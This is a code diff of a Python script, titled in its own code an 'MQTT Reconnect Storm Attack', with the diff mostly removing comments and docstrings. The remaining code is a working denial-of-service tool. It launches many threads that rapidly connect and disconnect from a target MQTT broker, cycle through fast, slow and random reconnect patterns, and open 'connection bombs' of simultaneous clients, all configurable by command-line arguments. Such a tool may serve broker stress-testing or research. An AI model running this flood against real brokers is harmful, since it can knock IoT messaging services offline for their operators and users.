@@ -1,5 +1,3 @@
-"""MQTT Reconnect Storm Attack - creates massive reconnection load to overwhelm broker."""
-
 import argparse
 import csv
 import json
@@ -10,7 +8,6 @@ import time
 from datetime import datetime, timezone
 
 import paho.mqtt.client as mqtt
-
 
 class ReconnectStormAttack:
     def __init__(self, args):
@@ -57,18 +54,15 @@ class ReconnectStormAttack:
             ])
 
     def update_connection_count(self, delta):
-        """Thread-safe update of active connection count"""
         with self.connection_lock:
             self.active_connections += delta
 
     def rapid_reconnect_worker(self, worker_id):
-        """Worker that rapidly connects and disconnects"""
         base_client_id = f"{self.args.client_prefix}_rapid_{worker_id:03d}"
         
         reconnect_count = 0
         
         while not self.stop_event.is_set() and reconnect_count < self.args.max_reconnects_per_worker:
-            # Use unique client ID for each connection to avoid conflicts
             client_id = f"{base_client_id}_{reconnect_count:04d}"
             client = mqtt.Client(client_id=client_id, clean_session=True)
             
@@ -116,18 +110,15 @@ class ReconnectStormAttack:
             client.on_disconnect = on_disconnect
             
             try:
-                # Attempt connection
                 client.connect(self.args.broker, self.args.port, self.args.keepalive)
                 client.loop_start()
                 
-                # Wait for connection with timeout
                 timeout = 5
                 start_wait = time.time()
                 while not connected and time.time() - start_wait < timeout and not self.stop_event.is_set():
                     time.sleep(0.01)
                 
                 if connected:
-                    # Brief session duration
                     session_duration = random.uniform(self.args.min_session_duration, 
                                                     self.args.max_session_duration)
                     time.sleep(session_duration)
@@ -137,7 +128,6 @@ class ReconnectStormAttack:
                 
                 reconnect_count += 1
                 
-                # Brief delay between reconnects
                 if self.args.reconnect_delay > 0:
                     time.sleep(random.uniform(0, self.args.reconnect_delay))
                 
@@ -147,33 +137,27 @@ class ReconnectStormAttack:
                     
                 self.log_connection_event(client_id, worker_id, "connect", "exception", 
                                         -1, 0, 0, f"error={str(e)}")
-                time.sleep(1)  # Error recovery delay
+                time.sleep(1)
         
         print(f"[Worker {worker_id}] Completed {reconnect_count} reconnections")
 
     def persistent_reconnect_worker(self, worker_id):
-        """Worker that maintains persistent reconnection patterns"""
         base_client_id = f"{self.args.client_prefix}_persist_{worker_id:03d}"
         
         cycle_count = 0
         
         while not self.stop_event.is_set():
-            # Cycle through different reconnection patterns
             if cycle_count % 3 == 0:
-                # Fast reconnect pattern
                 self.fast_reconnect_cycle(base_client_id, worker_id, cycle_count)
             elif cycle_count % 3 == 1:
-                # Slow reconnect pattern  
                 self.slow_reconnect_cycle(base_client_id, worker_id, cycle_count)
             else:
-                # Random reconnect pattern
                 self.random_reconnect_cycle(base_client_id, worker_id, cycle_count)
             
             cycle_count += 1
 
     def fast_reconnect_cycle(self, base_client_id, worker_id, cycle):
-        """Fast reconnection cycle - short sessions, quick reconnects"""
-        for i in range(20):  # 20 quick reconnects
+        for i in range(20):
             if self.stop_event.is_set():
                 break
                 
@@ -183,8 +167,7 @@ class ReconnectStormAttack:
                                        reconnect_delay=random.uniform(0.05, 0.2))
 
     def slow_reconnect_cycle(self, base_client_id, worker_id, cycle):
-        """Slow reconnection cycle - longer sessions, moderate reconnects"""
-        for i in range(5):  # 5 slower reconnects
+        for i in range(5):
             if self.stop_event.is_set():
                 break
                 
@@ -194,7 +177,6 @@ class ReconnectStormAttack:
                                        reconnect_delay=random.uniform(1, 3))
 
     def random_reconnect_cycle(self, base_client_id, worker_id, cycle):
-        """Random reconnection pattern"""
         reconnects = random.randint(5, 15)
         for i in range(reconnects):
             if self.stop_event.is_set():
@@ -206,7 +188,6 @@ class ReconnectStormAttack:
                                        reconnect_delay=random.uniform(0.01, 2))
 
     def single_connection_cycle(self, client_id, worker_id, session_duration, reconnect_delay):
-        """Perform a single connect-session-disconnect cycle"""
         client = mqtt.Client(client_id=client_id, clean_session=True)
         
         if self.args.username:
@@ -246,15 +227,13 @@ class ReconnectStormAttack:
             client.connect(self.args.broker, self.args.port, self.args.keepalive)
             client.loop_start()
             
-            # Wait for connection
             timeout = 3
             start_wait = time.time()
             while not connected and time.time() - start_wait < timeout and not self.stop_event.is_set():
                 time.sleep(0.01)
             
             if connected:
-                # Optional: publish during session
-                if random.random() < 0.3:  # 30% chance to publish
+                if random.random() < 0.3:
                     topic = f"reconnect/storm/{worker_id}/status"
                     payload = json.dumps({
                         "timestamp": datetime.now().isoformat(),
@@ -278,13 +257,11 @@ class ReconnectStormAttack:
                                     0, 0, f"error={str(e)}")
 
     def connection_bomb_worker(self, worker_id):
-        """Worker that creates connection bombs - many simultaneous connections"""
         print(f"[Worker {worker_id}] Starting connection bomb attack")
         
         bomb_size = self.args.bomb_size
         clients = []
         
-        # Create multiple clients simultaneously
         for i in range(bomb_size):
             if self.stop_event.is_set():
                 break
@@ -311,24 +288,21 @@ class ReconnectStormAttack:
             client.on_connect = make_on_connect(client_id, worker_id)
             clients.append((client, client_id))
         
-        # Connect all clients rapidly
         for client, client_id in clients:
             if self.stop_event.is_set():
                 break
             try:
                 client.connect(self.args.broker, self.args.port, self.args.keepalive)
                 client.loop_start()
-                time.sleep(0.01)  # Very brief delay
+                time.sleep(0.01)
             except Exception as e:
                 self.log_connection_event(client_id, worker_id, "bomb_connect", "exception", 
                                         -1, 0, 0, f"error={str(e)}")
         
         print(f"[Worker {worker_id}] Connection bomb launched: {len(clients)} clients")
         
-        # Hold connections for a period
         time.sleep(self.args.bomb_duration)
         
-        # Disconnect all
         for client, client_id in clients:
             try:
                 client.loop_stop()
@@ -341,7 +315,6 @@ class ReconnectStormAttack:
                 pass
 
     def attack_worker(self, worker_id):
-        """Main attack worker dispatcher"""
         attack_type = worker_id % 3
         
         try:
@@ -356,23 +329,20 @@ class ReconnectStormAttack:
             print(f"[Worker {worker_id}] Worker exception: {e}")
 
     def run(self):
-        """Start the reconnect storm attack"""
         print(f"Starting Reconnect Storm attack with {self.args.workers} workers")
         print(f"Target: {self.args.broker}:{self.args.port}")
         print(f"Max reconnects per worker: {self.args.max_reconnects_per_worker}")
         print(f"Session duration: {self.args.min_session_duration}-{self.args.max_session_duration}s")
         
-        # Start worker threads
         threads = []
         for i in range(self.args.workers):
             thread = threading.Thread(target=self.attack_worker, args=(i,))
             thread.daemon = True
             thread.start()
             threads.append(thread)
-            time.sleep(0.1)  # Brief stagger
+            time.sleep(0.1)
         
         try:
-            # Statistics reporting loop
             while True:
                 time.sleep(5)
                 with self.connection_lock:
@@ -392,7 +362,6 @@ class ReconnectStormAttack:
             print("\nStopping reconnect storm...")
             self.stop_event.set()
             
-            # Wait for threads to finish
             for thread in threads:
                 thread.join(timeout=15)
             
@@ -401,7 +370,6 @@ class ReconnectStormAttack:
             print(f"  Total connections: {self.total_connections}")
             print(f"  Total disconnections: {self.total_disconnections}")
             print(f"  Connection failures: {self.connection_failures}")
-
 
 def main():
     parser = argparse.ArgumentParser(description="MQTT Reconnect Storm Attack")
@@ -440,7 +408,6 @@ def main():
         attack.run()
     finally:
         attack.close()
-
 
 if __name__ == "__main__":
     main()
